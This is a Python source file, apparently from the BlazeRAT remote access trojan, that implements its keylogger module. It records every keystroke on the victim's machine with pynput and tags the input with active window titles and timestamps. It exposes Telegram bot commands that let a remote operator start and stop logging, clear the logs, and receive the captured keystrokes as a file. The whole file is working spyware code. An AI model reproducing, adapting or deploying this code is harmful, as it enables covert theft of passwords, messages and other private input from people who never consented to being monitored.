#!/usr/bin/python3
# -*- coding: utf-8 -*-

# Import modules
from time import ctime
from io import BytesIO
from core.logger import Log
from threading import Thread
from core.messages import services as Messages
from pynput.keyboard import Listener, Key  # pip install pynput
from services.keyboard import controller
from services.shell import System as RunSystemCommand

"""
Author : LimerBoy
github.com/LimerBoy/BlazeRAT

Notes :
    The file is needed
    to log all keyboard events.
"""

# Get active window title
def GetActiveWindowTitle() -> str:
    output = RunSystemCommand(" xdotool getwindowfocus getwindowname")
    return output[:-1]  # Remove '\n'

"""
Keylogger class:
https://github.com/LimerBoy/CrazyPy/blob/master/Spying/Keylogger.py
"""
class Logger:
    # Constructor
    def __init__(self, logs=""):
        self.__keys = logs
        self.__stopped = True
        self.__thread = Thread(target=self.__Run)
        self.__prev_window_title = ""

    # Log key press
    def __LogKeyPress(self, key: Key):
        key_text = (str(key)
                    .replace("\'", "")
                    .replace("Key.", ""))
        # Space
        if key == Key.space:
            key_text = " "
        # Enter (new line + active window title)
        elif key == Key.enter:
            active_window = GetActiveWindowTitle()
            if self.__prev_window_title == active_window:
                key_text = "\n"
            else:
                self.__prev_window_title = active_window
                key_text = f"\n\n ### {active_window} ({ctime()}) ###\n"
        # Shift (ignore)
        elif key == Key.shift:
            key_text = ""
        # BackSpace (remove latest char)
        elif key == Key.backspace and len(self.__keys) > 0:
            self.__keys = self.__keys[:-1]
            key_text = ""
        # Special key add [KEY]
        elif len(key_text) > 1:
            key_text = f"[{key_text}]".upper()
        # Append key to all keys
        self.__keys += key_text
        # On stop
        if self.__stopped:
            return False

    # Run logger
    def __Run(self):
        with Listener(on_press=self.__LogKeyPress) as listener:
            listener.join()

    # Return all logs
    def FetchLogs(self) -> str:
        return self.__keys

    # Clean logs
    def CleanLogs(self):
        self.__keys = ""

    # Start keylogger
    def Start(self):
        self.__stopped = False
        # Append active window title when logger started
        if len(self.__keys) < 5:
            self.__keys += f"\n ### {GetActiveWindowTitle()} ({ctime()}) ###\n"
        self.__thread.start()

    # Stop keylogger
    def Stop(self):
        self.__stopped = True
        controller.press(Key.space)
        controller.release(Key.space)
        self.__thread.join()

    # Is active
    def IsActive(self):
        return not self.__stopped


# Keylogger
__keylogger = Logger()

""" Handle telegram command """
def Handle(callback: dict, bot) -> None:
    global __keylogger
    chatid = callback.from_user.id
    action = callback.data[:-9]
    # Log
    Log("Keylogger >> Run action " + action, chatid)
    # Action
    bot.send_chat_action(chatid, "typing")
    # Enable keylogger
    if action == "Enable":
        if __keylogger.IsActive():
            result = Messages.keylogger_recording_not_stopped
        else:
            # Move logs when logger restarted
            logs = __keylogger.FetchLogs()
            __keylogger = Logger(logs)
            __keylogger.Start()
            result = Messages.keylogger_recording_started
    # Disable keylogger
    elif action == "Disable":
        if not __keylogger.IsActive():
            result = Messages.keylogger_recording_not_started
        else:
            __keylogger.Stop()
            result = Messages.keylogger_recording_stopped
    # Get keylogs
    elif action == "GetData":
        out = __keylogger.FetchLogs()
        if len(out) < 5:
            result = "Logs not found"
        else:
            obj = BytesIO()
            obj.write(out.encode("utf8"))
            return bot.send_document(
                chatid, obj.getvalue(),
                caption=Messages.keylogger_logs_received
            )
    # Clean logs
    elif action == "Clean":
        __keylogger.CleanLogs()
        result = Messages.keylogger_logs_cleaned
    # Send result
    bot.send_message(chatid, result)

